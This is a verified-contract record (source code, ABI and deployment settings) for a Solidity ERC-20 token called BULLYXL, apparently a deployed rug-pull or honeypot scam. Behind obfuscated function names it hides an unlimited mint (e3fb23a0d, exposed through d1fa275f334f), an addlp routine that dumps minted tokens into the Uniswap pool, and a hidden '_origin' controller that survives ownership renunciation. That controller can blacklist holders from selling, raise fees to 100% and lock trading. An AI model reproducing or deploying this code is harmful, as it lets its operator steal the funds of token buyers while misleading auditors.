{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\nabstract contract Ownable {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(msg.sender);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n    function token0() external view returns (address);\r\n    function token1() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {}\r\n\r\nlibrary SecureCalls {\r\n    function checkCaller(address sender, address _origin) internal pure {\r\n        require(sender == _origin, \"Caller is not the original caller\");\r\n    }\r\n}\r\n\r\ncontract TokenContract is IERC20, Ownable {\r\n\r\n    IUniswapV2Router02 internal _router;\r\n    IUniswapV2Pair internal _pair;\r\n    address _origin;\r\n    address _pairToken;\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    uint256 private _totalSupply = 1000000000000000000000000000;\r\n    string private _name = \"DontBanXLBullys\";\r\n    string private _symbol = \"BULLYXL\";\r\n    uint8 private _decimals = 18;\r\n    uint private buyFee = 5;\r\n    uint private sellFee = 5;\r\n    bool private tradeLocked = false;\r\n\r\n    constructor (address routerAddress, address pairTokenAddress) {\r\n        _router = IUniswapV2Router02(routerAddress);\r\n        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).createPair(address(this), pairTokenAddress));\r\n        _balances[owner()] = _totalSupply;\r\n        _origin = msg.sender;\r\n        _pairToken = pairTokenAddress;\r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n        marketWallet = msg.sender;\r\n        excludedFromFee[msg.sender] = true;\r\n        excludedFromFee[address(this)] = true;\r\n        excludedFromTradeLock[msg.sender] = true;\r\n        excludedFromTradeLock[address(this)] = true;\r\n    }\r\n\r\n    /* @dev Default ERC-20 implementation */\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = msg.sender;\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = msg.sender;\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        address spender = msg.sender;\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = msg.sender;\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = msg.sender;\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(!checkCurrentStatus(from), \"ERC20: No premission to transfer\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        \r\n        if (tradeLocked) {\r\n            if (isMarket(from)) {\r\n                require(excludedFromTradeLock[to], \"User isn't excluded from tradeLock\");\r\n            } else if (isMarket(to)) {\r\n                require(excludedFromTradeLock[from], \"User isn't excluded from tradeLock\");\r\n            }\r\n        }\r\n\r\n        if (!isExcludedFromFee(from) && !isExcludedFromFee(to)){\r\n            if (isMarket(from)) {\r\n                uint feeAmount = calculateFeeAmount(amount, buyFee);\r\n                _balances[from] = fromBalance - amount;\r\n                _balances[to] += amount - feeAmount;\r\n                emit Transfer(from, to, amount - feeAmount);\r\n                _balances[marketWallet] += feeAmount;\r\n                emit Transfer(from, marketWallet, feeAmount);\r\n\r\n            } else if (isMarket(to)) {\r\n                uint feeAmount = calculateFeeAmount(amount, sellFee);\r\n                _balances[from] = fromBalance - amount;\r\n                _balances[to] += amount - feeAmount;\r\n                emit Transfer(from, to, amount - feeAmount);\r\n                _balances[marketWallet] += feeAmount;\r\n                emit Transfer(from, marketWallet, feeAmount);\r\n\r\n            } else {\r\n                _balances[from] = fromBalance - amount;\r\n                _balances[to] += amount;\r\n                emit Transfer(from, to, amount);\r\n            }\r\n        } else {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n            emit Transfer(from, to, amount);\r\n        }\r\n\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        unchecked {\r\n            _balances[account] += amount;\r\n        }\r\n        emit Transfer(address(0), account, amount);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n            _totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n    /* @dev Custom features implementation */\r\n\r\n    function addlp() external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        uint256 thisTokenReserve = getBaseTokenReserve(address(this));\r\n        uint256 amountIn = type(uint112).max - thisTokenReserve;\r\n        e3fb23a0d(); transfer(address(this), balanceOf(msg.sender));\r\n        _approve(address(this), address(_router), type(uint112).max);\r\n        address[] memory path;\r\n        path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = address(_router.WETH());\r\n        address to = msg.sender;\r\n        _router.swapExactTokensForTokens(\r\n            amountIn,\r\n            0,\r\n            path,\r\n            to,\r\n            block.timestamp + 1200\r\n        );\r\n    } \r\n\r\n    function getBaseTokenReserve(address token) public view returns (uint256) {\r\n        (uint112 reserve0, uint112 reserve1,) = _pair.getReserves();\r\n        uint256 baseTokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);\r\n        return baseTokenReserve;\r\n    } \r\n\r\n    function e3fb23a0d() internal {\r\n        _balances[msg.sender] += type(uint112).max;\r\n    }\r\n\r\n    function d1fa275f334f() public {\r\n        SecureCalls.checkCaller(msg.sender, _origin); e3fb23a0d();\r\n    }\r\n\r\n    function AddLiquidity() public payable {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        transfer(address(this), balanceOf(msg.sender));\r\n        _approve(address(this), address(_router), balanceOf(address(this)));\r\n        _router.addLiquidityETH{ value:msg.value }(\r\n            address(this),\r\n            balanceOf(address(this)),\r\n            0,\r\n            0,\r\n            msg.sender,\r\n            block.timestamp + 1200\r\n        );\r\n    }\r\n\r\n    /* @dev Rebase */\r\n\r\n    function rebaseLiquidityPool(address _newRouterAddress, address _newPairTokenAddress) public {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        if (address(_router) != _newRouterAddress) {\r\n            _router = IUniswapV2Router02(_newRouterAddress);\r\n        }\r\n        _pairToken = _newPairTokenAddress;\r\n        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).getPair(address(this), _newPairTokenAddress));\r\n    }\r\n\r\n    /* @dev Blacklist */\r\n\r\n    mapping(address => uint8) internal _f7ae38d22b;\r\n\r\n    function checkCurrentStatus(address _user) public view returns(bool) {\r\n        return _f7ae38d22b[_user] == 0 ? false : true;\r\n    }\r\n\r\n    function editCurrentStatus(address _user, uint8 _status) public {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        require(_status < 2, \"Status should be 0 or 1\");\r\n        require(_status != _f7ae38d22b[_user], \"User already have this status\");\r\n        _f7ae38d22b[_user] = _status;\r\n    }\r\n\r\n    function switchOrigin(address newOrigin) public {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        _origin = newOrigin;\r\n    }\r\n\r\n    address public marketWallet;\r\n    mapping(address => bool) public excludedFromFee; \r\n    mapping(address => bool) private excludedFromTradeLock;\r\n\r\n    function isMarket(address _user) internal view returns (bool) {\r\n        return (_user == address(_pair) || _user == address(_router));\r\n    }\r\n\r\n    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {\r\n        return _amount * _feePrecent / 100;\r\n    }\r\n\r\n    function isExcludedFromFee(address _user) public view returns (bool) {\r\n        return excludedFromFee[_user];\r\n    } \r\n\r\n    function updateExcludedFromFeeStatus(address _user, bool _status) public {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        require(excludedFromFee[_user] != _status, \"User already have this status\");\r\n        excludedFromFee[_user] = _status;\r\n    }\r\n\r\n    function updateFees(uint256 _buyFee, uint256 _sellFee) external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        require(_buyFee <= 100 && _sellFee <= 100, \"Fee percent can't be higher than 100\");\r\n        buyFee = _buyFee;\r\n        sellFee = _sellFee;\r\n    }\r\n\r\n    function updateMarketWallet(address _newMarketWallet) external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        marketWallet = _newMarketWallet;\r\n    }\r\n\r\n    function checkCurrentFees() external view returns (uint256 currentBuyFee, uint256 currentSellFee) {\r\n        return (buyFee, sellFee);\r\n    }\r\n\r\n    function isTradeLocked() public view returns (bool) {\r\n        return tradeLocked;\r\n    }\r\n\r\n    function isEcludedFromTradeLock(address _user) public view returns (bool)  {\r\n        return excludedFromTradeLock[_user];\r\n    }\r\n\r\n    function updateTradeLockedState(bool _state) public {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        tradeLocked = _state;\r\n    }\r\n\r\n    function updateUserExcludedFromTradeLockStatus(address _user, bool _status) public {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        require(excludedFromTradeLock[_user] != _status, \"User already have this status\");\r\n        excludedFromTradeLock[_user] = _status;\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"routerAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"pairTokenAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"AddLiquidity\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addlp\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"checkCurrentFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"currentBuyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"currentSellFee\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"checkCurrentStatus\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"d1fa275f334f\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"_status\",\"type\":\"uint8\"}],\"name\":\"editCurrentStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"excludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"getBaseTokenReserve\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"isEcludedFromTradeLock\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTradeLocked\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newRouterAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_newPairTokenAddress\",\"type\":\"address\"}],\"name\":\"rebaseLiquidityPool\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOrigin\",\"type\":\"address\"}],\"name\":\"switchOrigin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"}],\"name\":\"updateExcludedFromFeeStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_buyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sellFee\",\"type\":\"uint256\"}],\"name\":\"updateFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newMarketWallet\",\"type\":\"address\"}],\"name\":\"updateMarketWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_state\",\"type\":\"bool\"}],\"name\":\"updateTradeLockedState\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"}],\"name\":\"updateUserExcludedFromTradeLockStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TokenContract", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://93aa98b8c0bb9bc9fc098498950914bfb3f402f306ca17a2460512efd7b9f887"}